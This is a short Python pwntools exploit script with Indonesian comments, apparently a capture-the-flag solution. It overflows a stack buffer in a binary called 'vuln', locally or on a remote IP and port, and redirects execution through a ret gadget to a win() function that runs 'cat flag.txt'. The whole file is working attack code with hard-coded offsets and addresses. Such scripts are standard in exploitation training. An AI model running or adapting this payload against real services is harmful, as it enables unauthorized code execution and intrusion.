#!/usr/bin/env python3
from pwn import *

# ====== KONFIGURASI ======
TARGET_BIN = "./vuln"
HOST = "103.127.98.249"
PORT = 10007

context.binary = elf = ELF(TARGET_BIN, checksec=True)
context.log_level = "info"

WIN_ADDR   = 0x401152        # alamat fungsi win() -> system("cat flag.txt")
RET_GADGET = 0x401016        # gadget 'ret' polos, buat fix stack alignment 16-byte sebelum call system()
OFFSET     = 0x48            # jarak buffer -> return address (0x40 buffer + 8 saved rbp)

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return process(TARGET_BIN)

def exploit():
    io = conn()

    payload  = b"A" * OFFSET
    payload += p64(RET_GADGET)
    payload += p64(WIN_ADDR)

    io.recvuntil(b"input:")
    io.sendline(payload)

    io.interactive()

if __name__ == "__main__":
    exploit()

    